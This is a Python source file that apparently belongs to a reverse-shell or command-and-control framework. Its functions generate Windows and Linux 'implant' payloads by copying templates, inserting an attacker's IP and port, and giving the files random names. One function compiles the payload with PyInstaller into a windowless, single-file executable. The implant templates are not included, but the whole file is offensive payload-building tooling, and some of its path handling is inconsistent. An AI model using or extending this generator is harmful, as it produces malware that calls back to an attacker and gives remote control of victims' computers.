import os
import shutil
import subprocess
import random
import string

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def create_windows_payload(host_ip, host_port):

    # generate random filename
    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{rand_name}.py'
    print(f'[+] Generating Windows payload file: {file_name}')

    check_cwd = os.getcwd()
    print(f'[+] Checking for {check_cwd}\\shells\\templates\\winplant.py')

    if os.path.exists(f'{check_cwd}\\shells\\templates\\winplant.py') or os.path.exists(f'{check_cwd}/shells/templates/winplant.py'):
        # copy it to the newly generated file
        shutil.copy('shells/templates/winplant.py', f'../payloads/{file_name}')
    else:
        print(bcolors.WARNING + '[-] winplant.py file not found.' + bcolors.ENDC)

    with open(f'../payloads/{file_name}') as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(f'../payloads/{file_name}', 'w') as f:
        f.write(new_host)
        f.close()

    with open(f'../payloads/{file_name}') as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(f'../payloads/{file_name}', 'w') as f:
        f.write(new_port)
        f.close()

    if os.path.exists(f'{check_cwd}\\payloads\\{file_name}') or os.path.exists(f'{check_cwd}/payloads/{file_name}'):
        print(bcolors.OKGREEN + f'[+] {file_name} saved to /payloads.' + bcolors.ENDC)
    else:
        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)

def create_unix_payload(host_ip, host_port):
    # TODO: Update to save new file to /payloads
    # generate random filename
    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{rand_name}.py'
    print(f'[+] Generating Linux payload file: {file_name}')

    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\unixplant.py') or os.path.exists(f'{check_cwd}/unixplant.py'):
        shutil.copy('templates/unixplant.py', file_name)
    else:
        print(bcolors.WARNING + '[-] unixplant.py file not found.' + bcolors.ENDC)

    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    if os.path.exists(f'{check_cwd}\\{file_name}') or os.path.exists(f'{check_cwd}/{file_name}'):
        print(bcolors.OKGREEN + f'[+] {file_name} saved to current directory.' + bcolors.ENDC)
    else:
        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)

def create_exe_payload(host_ip, host_port):
    # TODO: Update to save new file to /payloads
    # generate random filename
    rand_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{rand_name}.py'
    exe_file = f'{rand_name}.exe'
    print(f'[+] Generating exe payload file: {file_name}')

    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py') or os.path.exists(f'{check_cwd}/winplant.py'):
        shutil.copy('templates/winplant.py', file_name)
    else:
        print(bcolors.WARNING + '[-] winplant.py file not found.' + bcolors.ENDC)

    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()

    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, shell=True, stderr=subprocess.DEVNULL)
    os.remove(f'{rand_name}.spec')
    shutil.rmtree('build')

    if os.path.exists(f'{check_cwd}\\{exe_file}') or os.path.exists(f'{check_cwd}/{file_name}'):
        print(bcolors.OKGREEN + f'[+] {exe_file} saved to current directory.' + bcolors.ENDC)
    else:
        print(bcolors.FAIL + '[-] Some error occured during generation.' + bcolors.ENDC)
